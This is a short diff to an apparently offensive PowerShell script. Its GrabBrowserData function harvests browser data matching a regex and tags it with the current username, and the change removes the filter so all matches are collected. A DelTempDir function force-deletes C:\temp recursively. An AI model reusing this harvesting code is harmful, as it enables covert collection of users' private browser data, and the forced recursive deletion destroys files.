@@ -517,28 +517,24 @@ function GrabBrowserData {
 
     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
     $Value | ForEach-Object {
-        $Key = $_
-        if ($Key -match $Search){
-            New-Object -TypeName PSObject -Property @{
-                User = $env:UserName
-                Browser = $Browser
-                DataType = $DataType
-                Data = $_
-            }
+        New-Object -TypeName PSObject -Property @{
+            User = $env:UserName
+            Browser = $Browser
+            DataType = $DataType
+            Data = $_
         }
     } 
 }
 
 
 
-# Function to delete the temporary directory and create a zip archive
+# Function to delete the temporary directory
 function DelTempDir {
     Set-Location -Path "C:\"
 
         # Remove the C:\temp directory
         Remove-Item -Path "C:\temp" -Force -Recurse
     }
-}
 
 # Call TempDir
 TempDir
